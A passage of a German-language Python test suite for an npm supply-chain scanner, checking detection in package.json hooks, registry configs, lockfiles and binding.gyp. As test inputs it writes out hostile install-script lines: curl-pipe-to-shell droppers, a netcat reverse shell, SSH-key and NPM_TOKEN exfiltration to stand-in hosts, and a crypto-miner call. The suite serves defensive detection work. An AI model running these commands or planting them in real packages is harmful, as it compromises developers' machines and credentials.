#!/usr/bin/env python3
"""
test_scan_npm.py — Umfangreiche Unit-Tests für scan-npm.py

Teststruktur:
  - Jede Testklasse deckt genau einen Scanner oder eine Hilfsfunktion ab.
  - Jede Testmethode enthält einen Docstring, der erklärt:
      1. Was das Testziel ist (was soll erkannt werden?)
      2. Welche konkreten Eingabedaten verwendet werden
      3. Was das erwartete Ergebnis ist und warum

Ausführung:
  python3 -m pytest test_scan_npm.py -v
  python3 -m unittest discover -v

Exit-Codes:
  0 — Alle Tests bestanden
  1 — Mindestens ein Test fehlgeschlagen
"""

import importlib.util
import pathlib
import unittest

# scan-npm.py enthält einen Bindestrich im Dateinamen und kann daher nicht
# direkt mit 'import' geladen werden — importlib übernimmt das manuell.
_spec = importlib.util.spec_from_file_location(
    "scan_npm",
    pathlib.Path(__file__).parent / "scan-npm.py",
)
assert _spec is not None and _spec.loader is not None
_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_mod)  # type: ignore[union-attr]

_scan_package_json_lines = _mod._scan_package_json_lines
_scan_npmrc_lines        = _mod._scan_npmrc_lines
_scan_yarnrc_lines       = _mod._scan_yarnrc_lines
_scan_yarnrc_yml_lines   = _mod._scan_yarnrc_yml_lines
_scan_package_lock_lines = _mod._scan_package_lock_lines
_scan_binding_gyp_lines  = _mod._scan_binding_gyp_lines
_scan_js_lines           = _mod._scan_js_lines
_scan_js_split_var       = _mod._scan_js_split_var
_scan_js_cooccurrence    = _mod._scan_js_cooccurrence
_check_minified_lines    = _mod._check_minified_lines
Finding                  = _mod.Finding
MINIFIED_LINE_THRESHOLD  = _mod.MINIFIED_LINE_THRESHOLD


# ---------------------------------------------------------------------------
# Hilfsfunktion: Zeilen aus einem mehrzeiligen String erzeugen
# ---------------------------------------------------------------------------

def _lines(text: str) -> list[str]:
    """Konvertiert einen mehrzeiligen String in eine Liste von Zeilen (mit Zeilenumbruch)."""
    return [line + "\n" for line in text.splitlines()]


# ---------------------------------------------------------------------------
# Hilfsfunktion: Befunde nach Kategorie und Schweregrad filtern
# ---------------------------------------------------------------------------

def _findings_with(findings: list[Finding], *, category: str = "", severity: str = "") -> list[Finding]:
    """Filtert Befunde nach optionaler Kategorie und/oder Schweregrad."""
    result = findings
    if category:
        result = [f for f in result if f.category == category]
    if severity:
        result = [f for f in result if f.severity == severity]
    return result


# ===========================================================================
# Klasse 1: Tests für den package.json-Scanner
# ===========================================================================

class TestScanPackageJson(unittest.TestCase):
    """
    Testet _scan_package_json_lines(), den zentralen Scanner für package.json-Dateien.

    package.json ist der häufigste Angriffspunkt bei NPM-Supply-Chain-Angriffen, weil
    Lifecycle-Hooks (postinstall, preinstall usw.) bei jedem `npm install` automatisch
    ausgeführt werden — ohne explizite Bestätigung des Nutzers.
    """

    # -----------------------------------------------------------------------
    # 1.1 Lifecycle-Hooks werden als INFO gemeldet
    # -----------------------------------------------------------------------

    def test_lifecycle_hook_postinstall_info(self):
        """
        Ziel: Jedes vorhandene Lifecycle-Skript soll als INFO-Befund gemeldet werden,
              damit der Prüfer weiß, welche Hooks existieren — unabhängig davon, ob
              sie gefährliche Muster enthalten.

        Eingabe: package.json mit einem harmlosen 'postinstall'-Skript ('echo Hallo').

        Erwartung: Genau ein Befund der Kategorie LIFECYCLE_HOOKS_FOUND mit
                   Schweregrad INFO. So wird sichergestellt, dass Hooks nicht
                   stillschweigend ignoriert werden.
        """
        data = '{"scripts": {"postinstall": "echo Hallo"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        hooks = _findings_with(findings, category="LIFECYCLE_HOOKS_FOUND", severity="INFO")
        self.assertEqual(len(hooks), 1, "Harmloser Lifecycle-Hook soll als INFO gemeldet werden")
        self.assertIn("postinstall", hooks[0].source)

    def test_lifecycle_hook_preinstall_info(self):
        """
        Ziel: Auch 'preinstall' soll als INFO-Befund erscheinen.

        Eingabe: package.json mit 'preinstall: echo start'.

        Erwartung: Ein INFO-Befund für preinstall. Damit wird geprüft, dass nicht
                   nur postinstall, sondern alle Hooks aus LIFECYCLE_HOOKS erkannt werden.
        """
        data = '{"scripts": {"preinstall": "echo start"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        hooks = _findings_with(findings, category="LIFECYCLE_HOOKS_FOUND", severity="INFO")
        self.assertTrue(any("preinstall" in f.source for f in hooks))

    def test_no_lifecycle_hook_no_finding(self):
        """
        Ziel: Wenn keine Lifecycle-Hooks vorhanden sind, sollen keine LIFECYCLE_HOOKS_FOUND-
              Befunde erzeugt werden. Ein reines 'build'-Skript ist kein Install-Hook.

        Eingabe: package.json mit nur 'build: tsc'.

        Erwartung: Keine LIFECYCLE_HOOKS_FOUND-Befunde — 'build' ist kein Lifecycle-Hook.
        """
        data = '{"scripts": {"build": "tsc"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        hooks = _findings_with(findings, category="LIFECYCLE_HOOKS_FOUND")
        self.assertEqual(len(hooks), 0)

    # -----------------------------------------------------------------------
    # 1.2 Gefährliche Muster in Lifecycle-Hooks → HIGH
    # -----------------------------------------------------------------------

    def test_curl_in_postinstall_high(self):
        """
        Ziel: 'curl' in einem postinstall-Skript ist ein klassischer Download-Vektor
              für Schadsoftware (z. B. curl http://evil.com/dropper.sh | sh).

        Eingabe: postinstall ruft curl auf.

        Erwartung: Ein HIGH-Befund der Kategorie INSTALL_SCRIPT. Die curl-Erkennung
                   ist eine der wichtigsten Regeln, da sie in realen Angriffen wie
                   'event-stream' und 'ua-parser-js' eingesetzt wurde.
        """
        data = '{"scripts": {"postinstall": "curl http://evil.example.com/dropper.sh | sh"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        high = _findings_with(findings, category="INSTALL_SCRIPT", severity="HIGH")
        self.assertTrue(len(high) >= 1, "curl in postinstall soll HIGH-Befund erzeugen")

    def test_wget_in_preinstall_high(self):
        """
        Ziel: 'wget' in preinstall ist wie curl ein Download-Vektor.

        Eingabe: preinstall ruft wget auf.

        Erwartung: Ein HIGH-Befund für INSTALL_SCRIPT. wget ist auf Linux-Systemen
                   häufig verfügbar und wird in Angriffen als Alternative zu curl genutzt.
        """
        data = '{"scripts": {"preinstall": "wget http://evil.example.com/malware -O /tmp/m"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        high = _findings_with(findings, category="INSTALL_SCRIPT", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_chmod_in_install_high(self):
        """
        Ziel: 'chmod 755' in einem Install-Skript setzt ausführbare Bits auf Dateien —
              typischerweise auf einen heruntergeladenen Payload.

        Eingabe: install-Skript führt chmod 755 aus.

        Erwartung: HIGH-Befund, weil chmod mit ausführbaren Bits in Verbindung mit
                   Install-Hooks eine gängige Technik ist, um einen Dropper vorzubereiten.
        """
        data = '{"scripts": {"install": "chmod 755 ./malware"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        high = _findings_with(findings, category="INSTALL_SCRIPT", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_netcat_in_install_high(self):
        """
        Ziel: 'nc' (netcat) im Install-Skript ist ein starker Hinweis auf eine
              Reverse Shell, bei der eine ausgehende TCP-Verbindung zum Angreifer
              geöffnet wird.

        Eingabe: install-Skript enthält 'nc -e /bin/sh'.

        Erwartung: HIGH-Befund für INSTALL_SCRIPT.
        """
        data = '{"scripts": {"install": "nc -e /bin/sh attacker.example.com 4444"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        high = _findings_with(findings, category="INSTALL_SCRIPT", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_python_inline_in_prepare_high(self):
        """
        Ziel: 'python3 -c' im prepare-Hook erlaubt inline Python-Ausführung —
              ein Angriffsvektor, der Shell-Einschränkungen umgeht.

        Eingabe: prepare-Skript nutzt python3 -c.

        Erwartung: HIGH-Befund für INSTALL_SCRIPT.
        """
        data = '{"scripts": {"prepare": "python3 -c \'import os; os.system(chr(105)+chr(100))\'"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        high = _findings_with(findings, category="INSTALL_SCRIPT", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_base64_decode_in_install_high(self):
        """
        Ziel: 'base64 --decode' kombiniert mit anderen Befehlen verschleiert einen
              Payload — der eigentliche Schadcode ist base64-kodiert und wird erst
              zur Laufzeit entschlüsselt und ausgeführt.

        Eingabe: install-Skript dekodiert einen base64-String.

        Erwartung: HIGH-Befund, weil base64-Dekodierung ein Klassiker der Payload-
                   Verschleierung ist (z. B. 'echo <base64> | base64 --decode | sh').
        """
        data = '{"scripts": {"install": "echo Y3VybA== | base64 --decode | sh"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        high = _findings_with(findings, category="INSTALL_SCRIPT", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_ssh_path_in_install_high(self):
        """
        Ziel: Zugriff auf das .ssh-Verzeichnis in einem Install-Skript deutet auf
              SSH-Schlüssel-Diebstahl hin — ein hochwertiges Angriffsziel.

        Eingabe: install-Skript liest aus ~/.ssh/.

        Erwartung: HIGH-Befund für INSTALL_SCRIPT.
        """
        data = '{"scripts": {"install": "cat ~/.ssh/id_rsa | curl -F f=@- https://paste.example.com"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        high = _findings_with(findings, category="INSTALL_SCRIPT", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    def test_stratum_in_postpack_high(self):
        """
        Ziel: Das Stratum-Protokoll (stratum+tcp://) wird ausschließlich von
              Krypto-Mining-Clients verwendet — kein legitimes npm-Skript braucht dies.

        Eingabe: postpack-Skript enthält eine stratum+tcp://-URL.

        Erwartung: HIGH-Befund für INSTALL_SCRIPT.
        """
        data = '{"scripts": {"postpack": "xmrig stratum+tcp://pool.xmr.example.com:3333"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        high = _findings_with(findings, category="INSTALL_SCRIPT", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    # -----------------------------------------------------------------------
    # 1.3 node -e → MEDIUM
    # -----------------------------------------------------------------------

    def test_node_inline_eval_medium(self):
        """
        Ziel: 'node -e' erlaubt beliebige JavaScript-Ausführung direkt in der Shell —
              ein häufiger Weg, um einen kleinen Inline-Loader zu verstecken.

        Eingabe: prepack-Skript nutzt 'node -e'.

        Erwartung: MEDIUM-Befund für INSTALL_SCRIPT. Der Schweregrad ist MEDIUM statt HIGH,
                   weil node -e allein (z. B. für Versions-Checks) legitim sein kann, aber
                   in Kombination mit anderen Indikatoren ein klares Warnsignal ist.
        """
        data = '{"scripts": {"prepack": "node -e \\"console.log(process.version)\\""}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        medium = _findings_with(findings, category="INSTALL_SCRIPT", severity="MEDIUM")
        self.assertTrue(len(medium) >= 1)

    # -----------------------------------------------------------------------
    # 1.4 process.env + Netzwerk in Install-Skript → HIGH
    # -----------------------------------------------------------------------

    def test_process_env_plus_http_high(self):
        """
        Ziel: process.env allein ist in Install-Skripten normal (z. B. NODE_ENV-Check).
              Erst die Kombination mit einem ausgehenden HTTP-Aufruf im selben Skript-String
              macht es gefährlich — das ist ein klares Exfiltrationsmuster.

        Eingabe: preinstall-Skript enthält sowohl process.env als auch einen HTTP-Aufruf.

        Erwartung: HIGH-Befund, weil Anmeldedaten aus der Umgebung an einen externen
                   Server gesendet werden könnten.
        """
        data = '{"scripts": {"preinstall": "node -e \\"require(\'https\').get(\'https://c2.example.com?k=\'+process.env.NPM_TOKEN)\\""}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        high = _findings_with(findings, category="INSTALL_SCRIPT", severity="HIGH")
        self.assertTrue(len(high) >= 1)

    # -----------------------------------------------------------------------
    # 1.5 Git-URL-Abhängigkeiten → SUPPLY_CHAIN MEDIUM
    # -----------------------------------------------------------------------

    def test_git_url_dependency_medium(self):
        """
        Ziel: Abhängigkeiten mit Git-URLs (git+https://...) umgehen die npm-Registry
              und laden Code direkt aus einem beliebigen Git-Repository. Dies ist ein
              Einfallstor für Supply-Chain-Angriffe, da kein Integritäts-Check stattfindet.

        Eingabe: dependencies enthält eine git+https://-URL.

        Erwartung: MEDIUM-Befund der Kategorie SUPPLY_CHAIN.
        """
        data = '{"dependencies": {"evil-pkg": "git+https://github.com/attacker/evil.git"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        supply = _findings_with(findings, category="SUPPLY_CHAIN", severity="MEDIUM")
        self.assertTrue(len(supply) >= 1)
        self.assertIn("evil-pkg", supply[0].source)

    def test_github_shorthand_dependency_medium(self):
        """
        Ziel: Der GitHub-Kurzform-Syntax 'github:user/repo' lädt ebenfalls direkt
              aus GitHub, ohne den npm-Registry-Integritätscheck.

        Eingabe: dependencies enthält 'github:attacker/malware-pkg'.

        Erwartung: MEDIUM-Befund für SUPPLY_CHAIN.
        """
        data = '{"dependencies": {"stealth": "github:attacker/malware-pkg"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        supply = _findings_with(findings, category="SUPPLY_CHAIN")
        self.assertTrue(len(supply) >= 1)

    def test_registry_url_dependency_safe(self):
        """
        Ziel: Normale Versionsangaben ('^4.17.21') sollen keinen SUPPLY_CHAIN-Befund erzeugen.

        Eingabe: dependencies mit Standard-Semver-Version.

        Erwartung: Kein SUPPLY_CHAIN-Befund — Standard-npm-Versionen sind erlaubt.
        """
        data = '{"dependencies": {"lodash": "^4.17.21"}}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        supply = _findings_with(findings, category="SUPPLY_CHAIN")
        self.assertEqual(len(supply), 0)

    # -----------------------------------------------------------------------
    # 1.6 gypfile: true → INSTALL_SCRIPT MEDIUM
    # -----------------------------------------------------------------------

    def test_gypfile_true_medium(self):
        """
        Ziel: '"gypfile": true' in package.json bewirkt, dass npm automatisch
              'node-gyp rebuild' beim Installieren ausführt — auch ohne Eintrag
              in 'scripts'. Dies ist ein versteckter Install-Hook.

        Eingabe: package.json mit "gypfile": true.

        Erwartung: MEDIUM-Befund für INSTALL_SCRIPT, weil dieser Hook für den
                   Nutzer nicht offensichtlich sichtbar ist.
        """
        data = '{"name": "native-addon", "gypfile": true}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        medium = _findings_with(findings, category="INSTALL_SCRIPT", severity="MEDIUM")
        self.assertTrue(any("gypfile" in f.source for f in medium))

    # -----------------------------------------------------------------------
    # 1.7 Ungültiges JSON → keine Befunde, kein Absturz
    # -----------------------------------------------------------------------

    def test_invalid_json_no_crash(self):
        """
        Ziel: Wenn package.json kein gültiges JSON enthält (z. B. durch Beschädigung),
              soll der Scanner ohne Absturz null Befunde zurückgeben.

        Eingabe: Kein gültiges JSON.

        Erwartung: Leere Befundliste — der Scanner soll nie eine Exception werfen,
                   da er Teil einer automatisierten Pipeline sein kann.
        """
        findings = _scan_package_json_lines(_lines("{ ungültig json ]"), "package.json")
        self.assertEqual(findings, [])

    # -----------------------------------------------------------------------
    # 1.8 Leere scripts → keine INSTALL_SCRIPT-Befunde
    # -----------------------------------------------------------------------

    def test_empty_scripts_no_findings(self):
        """
        Ziel: Ein package.json ohne Scripts-Schlüssel soll keine Lifecycle- oder
              INSTALL_SCRIPT-Befunde erzeugen.

        Eingabe: package.json ohne scripts-Schlüssel.

        Erwartung: Keine INSTALL_SCRIPT- und keine LIFECYCLE_HOOKS_FOUND-Befunde.
        """
        data = '{"name": "my-pkg", "version": "1.0.0"}'
        findings = _scan_package_json_lines(_lines(data), "package.json")
        self.assertEqual(_findings_with(findings, category="INSTALL_SCRIPT"), [])
        self.assertEqual(_findings_with(findings, category="LIFECYCLE_HOOKS_FOUND"), [])


# ===========================================================================
# Klasse 2: Tests für den .npmrc-Scanner
# ===========================================================================

class TestScanNpmrc(unittest.TestCase):
    """
    Testet _scan_npmrc_lines(), den Scanner für .npmrc-Konfigurationsdateien.

    .npmrc kann die npm-Registry umleiten (alle Pakete von einem bösen Mirror laden)
    und hardcodierte Auth-Tokens enthalten (Credential-Diebstahl beim Checkout).
    """

    def test_non_standard_registry_medium(self):
        """
        Ziel: Eine Registry-Zeile, die auf eine unbekannte Domain zeigt, soll als
              SUPPLY_CHAIN-Befund gemeldet werden.

        Eingabe: registry=https://evil-registry.example.com/npm/

        Erwartung: MEDIUM-Befund für SUPPLY_CHAIN. Bei einer umgeleiteten Registry
                   können alle installierten Pakete durch manipulierte Versionen
                   ersetzt werden (Dependency Confusion, Typosquatting).
        """
        lines = _lines("registry=https://evil-registry.example.com/npm/")
        findings = _scan_npmrc_lines(lines, ".npmrc")
        supply = _findings_with(findings, category="SUPPLY_CHAIN", severity="MEDIUM")
        self.assertTrue(len(supply) >= 1)
        self.assertIn("evil-registry.example.com", supply[0].detail)

    def test_npmjs_registry_safe(self):
        """
        Ziel: Die offizielle npm-Registry (https://registry.npmjs.org) soll keinen
              SUPPLY_CHAIN-Befund erzeugen.

        Eingabe: registry=https://registry.npmjs.org

        Erwartung: Keine SUPPLY_CHAIN-Befunde — die offizielle Registry ist sicher.
        """
        lines = _lines("registry=https://registry.npmjs.org")
        findings = _scan_npmrc_lines(lines, ".npmrc")
        self.assertEqual(_findings_with(findings, category="SUPPLY_CHAIN"), [])

    def test_yarnpkg_registry_safe(self):
        """
        Ziel: Die Yarn-Registry (https://registry.yarnpkg.com) ist ein legitimer
              Mirror und soll keinen Befund auslösen.

        Eingabe: registry=https://registry.yarnpkg.com

        Erwartung: Keine SUPPLY_CHAIN-Befunde.
        """
        lines = _lines("registry=https://registry.yarnpkg.com")
        findings = _scan_npmrc_lines(lines, ".npmrc")
        self.assertEqual(_findings_with(findings, category="SUPPLY_CHAIN"), [])

    def test_github_packages_registry_safe(self):
        """
        Ziel: GitHub Packages (npm.pkg.github.com) ist eine erlaubte Registry.

        Eingabe: registry=https://npm.pkg.github.com

        Erwartung: Keine SUPPLY_CHAIN-Befunde.
        """
        lines = _lines("registry=https://npm.pkg.github.com")
        findings = _scan_npmrc_lines(lines, ".npmrc")
        self.assertEqual(_findings_with(findings, category="SUPPLY_CHAIN"), [])

    def test_hardcoded_auth_token_medium(self):
        """
        Ziel: Ein hardcodierter _authToken in .npmrc stellt ein Credential-Leak dar.
              Wenn die Datei in einem öffentlichen Repository committet wird, können
              Angreifer das Token nutzen, um als der Entwickler npm-Pakete zu veröffentlichen.

        Eingabe: //registry.example.com/:_authToken=npm_FAKETOKEN123

        Erwartung: MEDIUM-Befund für EXFILTRATION, und das Token soll in der Ausgabe
                   maskiert sein (***).
        """
        lines = _lines("//evil-registry.example.com/:_authToken=npm_FAKETOKEN0123456789abcdef")
        findings = _scan_npmrc_lines(lines, ".npmrc")
        exfil = _findings_with(findings, category="EXFILTRATION", severity="MEDIUM")
        self.assertTrue(len(exfil) >= 1)
        self.assertNotIn("npm_FAKETOKEN", exfil[0].context,
                         "Token soll im Kontext maskiert (*) sein")

    def test_comment_lines_ignored(self):
        """
        Ziel: Kommentarzeilen (mit # oder ;) sollen keine Befunde auslösen,
              auch wenn sie zufällig einen Registry-Eintrag enthalten.

        Eingabe: Auskommentierter Registry-Eintrag.

        Erwartung: Keine Befunde — Kommentare sind keine aktiven Konfigurationszeilen.
        """
        lines = _lines("# registry=https://evil-registry.example.com/")
        findings = _scan_npmrc_lines(lines, ".npmrc")
        self.assertEqual(findings, [])

    def test_scoped_non_standard_registry_medium(self):
        """
        Ziel: Auch scoped Registries (z. B. @myorg:registry=...) können auf fremde
              Server zeigen und sollen erkannt werden.

        Eingabe: @evil:registry=https://evil.example.com/npm/

        Erwartung: MEDIUM-Befund für SUPPLY_CHAIN, weil scoped Registries gezielt
                   nur bestimmte Pakete umleiten (Dependency Confusion auf Scope-Ebene).
        """
        lines = _lines("@evil:registry=https://evil.example.com/npm/")
        findings = _scan_npmrc_lines(lines, ".npmrc")
        supply = _findings_with(findings, category="SUPPLY_CHAIN")
        self.assertTrue(len(supply) >= 1)


# ===========================================================================
# Klasse 3: Tests für den .yarnrc-Scanner (Yarn v1)
# ===========================================================================

class TestScanYarnrc(unittest.TestCase):
    """
    Testet _scan_yarnrc_lines(), den Scanner für Yarn v1 .yarnrc-Dateien.

    Das Format ist zeilenbasiert: 'registry https://...' (ohne '=').
    Gefährlich sind Registry-Umleitungen und hardcodierte Tokens.
    """

    def test_non_standard_registry_medium(self):
        """
        Ziel: Eine nicht-standardmäßige Registry-Zeile soll als SUPPLY_CHAIN-Befund
              erkannt werden.

        Eingabe: 'registry https://evil-registry.example.com/yarn/'

        Erwartung: MEDIUM-Befund für SUPPLY_CHAIN.
        """
        lines = _lines("registry https://evil-registry.example.com/yarn/")
        findings = _scan_yarnrc_lines(lines, ".yarnrc")
        supply = _findings_with(findings, category="SUPPLY_CHAIN", severity="MEDIUM")
        self.assertTrue(len(supply) >= 1)

    def test_npmjs_registry_safe(self):
        """
        Ziel: Die offizielle npm-Registry in .yarnrc soll kein Warnsignal auslösen.

        Eingabe: 'registry https://registry.npmjs.org'

        Erwartung: Keine SUPPLY_CHAIN-Befunde.
        """
        lines = _lines("registry https://registry.npmjs.org")
        findings = _scan_yarnrc_lines(lines, ".yarnrc")
        self.assertEqual(_findings_with(findings, category="SUPPLY_CHAIN"), [])

    def test_hardcoded_auth_token_medium(self):
        """
        Ziel: Hardcodierter _authToken in .yarnrc soll als EXFILTRATION erkannt werden.

        Eingabe: '//evil-registry.example.com/:_authToken=fake_token_abc123'

        Erwartung: MEDIUM-Befund für EXFILTRATION mit maskiertem Token in context.
        """
        lines = _lines("//evil-registry.example.com/:_authToken=fake_yarn_token_0123456789abcdef")
        findings = _scan_yarnrc_lines(lines, ".yarnrc")
        exfil = _findings_with(findings, category="EXFILTRATION", severity="MEDIUM")
        self.assertTrue(len(exfil) >= 1)
        self.assertNotIn("fake_yarn_token", exfil[0].context)

    def test_comment_ignored(self):
        """
        Ziel: Mit # beginnende Kommentarzeilen sollen ignoriert werden.

        Eingabe: Auskommentierter Registry-Eintrag.

        Erwartung: Keine Befunde.
        """
        lines = _lines("# registry https://evil.example.com/")
        findings = _scan_yarnrc_lines(lines, ".yarnrc")
        self.assertEqual(findings, [])


# ===========================================================================
# Klasse 4: Tests für den .yarnrc.yml-Scanner (Yarn v2/v3)
# ===========================================================================

class TestScanYarnrcYml(unittest.TestCase):
    """
    Testet _scan_yarnrc_yml_lines(), den Scanner für Yarn v2/v3 .yarnrc.yml-Dateien.

    Das YAML-Format verwendet 'npmRegistryServer:' statt 'registry'.
    Besonders gefährlich: Plugin-URLs (Yarn-Plugins können beliebigen Code ausführen).
    """

    def test_non_standard_registry_medium(self):
        """
        Ziel: 'npmRegistryServer' mit externer URL soll als SUPPLY_CHAIN erkannt werden.

        Eingabe: npmRegistryServer: "https://evil-registry.example.com/yarn/"

        Erwartung: MEDIUM-Befund für SUPPLY_CHAIN.
        """
        lines = _lines('npmRegistryServer: "https://evil-registry.example.com/yarn/"')
        findings = _scan_yarnrc_yml_lines(lines, ".yarnrc.yml")
        supply = _findings_with(findings, category="SUPPLY_CHAIN", severity="MEDIUM")
        self.assertTrue(len(supply) >= 1)

    def test_official_registry_safe(self):
        """
        Ziel: Der offizielle npm-Registry-Server soll keinen Befund auslösen.

        Eingabe: npmRegistryServer: "https://registry.npmjs.org"

        Erwartung: Keine SUPPLY_CHAIN-Befunde.
        """
        lines = _lines('npmRegistryServer: "https://registry.npmjs.org"')
        findings = _scan_yarnrc_yml_lines(lines, ".yarnrc.yml")
        self.assertEqual(_findings_with(findings, category="SUPPLY_CHAIN"), [])

    def test_hardcoded_auth_token_medium(self):
        """
        Ziel: 'npmAuthToken:' mit einem Wert soll als EXFILTRATION erkannt werden.

        Eingabe: npmAuthToken: "fake_yarnv2_token_0123456789abcdef"

        Erwartung: MEDIUM-Befund für EXFILTRATION mit maskiertem Token.
        """
        lines = _lines('npmAuthToken: "fake_yarnv2_token_0123456789abcdef"')
        findings = _scan_yarnrc_yml_lines(lines, ".yarnrc.yml")
        exfil = _findings_with(findings, category="EXFILTRATION", severity="MEDIUM")
        self.assertTrue(len(exfil) >= 1)
        self.assertNotIn("fake_yarnv2_token", exfil[0].context)

    def test_plugin_from_external_url_high(self):
        """
        Ziel: Yarn-Plugins, die von einer externen URL geladen werden, sind ein
              kritisches Supply-Chain-Risiko — Plugins haben vollen Zugriff auf
              das Yarn-Lifecycle-System und können beliebigen Code zur Installationszeit
              ausführen.

        Eingabe: Plugin-Konfiguration mit 'path: https://evil.example.com/plugin.cjs'

        Erwartung: HIGH-Befund für SUPPLY_CHAIN — der höchste Schweregrad, weil
                   keine Integritätsprüfung stattfindet.
        """
        lines = _lines("  - path: https://evil-registry.example.com/yarn-plugin-evil.cjs")
        findings = _scan_yarnrc_yml_lines(lines, ".yarnrc.yml")
        high = _findings_with(findings, category="SUPPLY_CHAIN", severity="HIGH")
        self.assertTrue(len(high) >= 1, "Plugin von externer URL soll HIGH-Befund erzeugen")


# ===========================================================================
# Klasse 5: Tests für den package-lock.json-Scanner
# ===========================================================================

class TestScanPackageLock(unittest.TestCase):
    """
    Testet _scan_package_lock_lines(), den Scanner für package-lock.json.

    package-lock.json enthält die aufgelösten Download-URLs aller Abhängigkeiten.
    Wenn diese URLs auf fremde Server zeigen, wurden Pakete nicht von der offiziellen
    npm-Registry bezogen.
    """

    def test_non_standard_resolved_url_v2_medium(self):
        """
        Ziel: In einem lockfileVersion-2-Format soll eine aufgelöste URL, die nicht
              auf die Standard-Registries zeigt, als SUPPLY_CHAIN erkannt werden.

        Eingabe: packages["node_modules/evil"].resolved zeigt auf evil-registry.example.com

        Erwartung: MEDIUM-Befund für SUPPLY_CHAIN. Dies ist wichtig, weil jemand die
                   lock-Datei manipuliert haben könnte, um ein Paket von einem bösen
                   Server zu beziehen, ohne dass package.json geändert wurde.
        """
        data = """{
            "lockfileVersion": 2,
            "packages": {
                "node_modules/evil-backdoor": {
                    "version": "1.0.0",
                    "resolved": "https://evil-registry.example.com/npm/evil-backdoor-1.0.0.tgz"
                }
            }
        }"""
        findings = _scan_package_lock_lines(_lines(data), "package-lock.json")
        supply = _findings_with(findings, category="SUPPLY_CHAIN", severity="MEDIUM")
        self.assertTrue(len(supply) >= 1)
        self.assertIn("evil-registry.example.com", supply[0].detail)

    def test_standard_registry_resolved_safe_v2(self):
        """
        Ziel: Aufgelöste URLs von der offiziellen npm-Registry (registry.npmjs.org)
              sollen keinen Befund auslösen.

        Eingabe: resolved zeigt auf https://registry.npmjs.org/...

        Erwartung: Keine SUPPLY_CHAIN-Befunde.
        """
        data = """{
            "lockfileVersion": 2,
            "packages": {
                "node_modules/lodash": {
                    "version": "4.17.21",
                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
                }
            }
        }"""
        findings = _scan_package_lock_lines(_lines(data), "package-lock.json")
        self.assertEqual(_findings_with(findings, category="SUPPLY_CHAIN"), [])

    def test_non_standard_resolved_url_v1_medium(self):
        """
        Ziel: Auch im alten lockfileVersion-1-Format (dependencies[name].resolved)
              sollen nicht-standard URLs erkannt werden.

        Eingabe: v1-Format mit evil-registry.example.com als resolved-URL.

        Erwartung: MEDIUM-Befund für SUPPLY_CHAIN.
        """
        data = """{
            "lockfileVersion": 1,
            "dependencies": {
                "evil-pkg": {
                    "version": "1.0.0",
                    "resolved": "https://evil-registry.example.com/npm/evil-pkg-1.0.0.tgz"
                }
            }
        }"""
        findings = _scan_package_lock_lines(_lines(data), "package-lock.json")
        supply = _findings_with(findings, category="SUPPLY_CHAIN", severity="MEDIUM")
        self.assertTrue(len(supply) >= 1)

    def test_file_protocol_ignored(self):
        """
        Ziel: 'file:'-URLs (lokale Pakete) sind legitim und sollen keinen Befund auslösen.

        Eingabe: resolved = "file:../local-pkg"

        Erwartung: Keine SUPPLY_CHAIN-Befunde — file: ist kein Netzwerkvector.
        """
        data = """{
            "lockfileVersion": 2,
            "packages": {
                "node_modules/local-pkg": {
                    "version": "1.0.0",
                    "resolved": "file:../local-pkg"
                }
            }
        }"""
        findings = _scan_package_lock_lines(_lines(data), "package-lock.json")
        self.assertEqual(_findings_with(findings, category="SUPPLY_CHAIN"), [])

    def test_invalid_json_no_crash(self):
        """
        Ziel: Ungültiges JSON soll keinen Absturz verursachen.

        Eingabe: Kein gültiges JSON.

        Erwartung: Leere Befundliste.
        """
        findings = _scan_package_lock_lines(_lines("{ ungültig }"), "package-lock.json")
        self.assertEqual(findings, [])


# ===========================================================================
# Klasse 6: Tests für den binding.gyp-Scanner
# ===========================================================================

class TestScanBindingGyp(unittest.TestCase):
    """
    Testet _scan_binding_gyp_lines(), den Scanner für binding.gyp-Dateien.

    binding.gyp ist die Build-Konfiguration für native Node.js-Addons (node-gyp).
    Ihr bloßes Vorhandensein löst automatisch 'node-gyp rebuild' beim npm-Install aus —
    ohne Eintrag in package.json scripts. Attackers nutzen dies, um Build-Skripte
    zu verstecken.
    """

    def test_presence_triggers_medium(self):
        """
        Ziel: Eine binding.gyp-Datei soll immer einen MEDIUM-Befund erzeugen,
              unabhängig von ihrem Inhalt — allein ihr Vorhandensein ist ein
              versteckter Install-Hook.

        Eingabe: Harmlose binding.gyp ohne verdächtige Muster.

        Erwartung: Genau ein MEDIUM-Befund für INSTALL_SCRIPT (die reine Existenz).
        """
        content = '{"targets": [{"target_name": "addon", "sources": ["addon.cc"]}]}'
        findings = _scan_binding_gyp_lines(_lines(content), "binding.gyp")
        medium = _findings_with(findings, category="INSTALL_SCRIPT", severity="MEDIUM")
        self.assertEqual(len(medium), 1, "binding.gyp Existenz soll immer MEDIUM erzeugen")
        self.assertIn("binding.gyp", medium[0].source)

    def test_curl_in_action_high(self):
        """
        Ziel: 'curl' in einer binding.gyp-Aktion ist gefährlicher als in einem
              npm-Skript — es wird durch den C++-Build-Prozess ausgeführt und
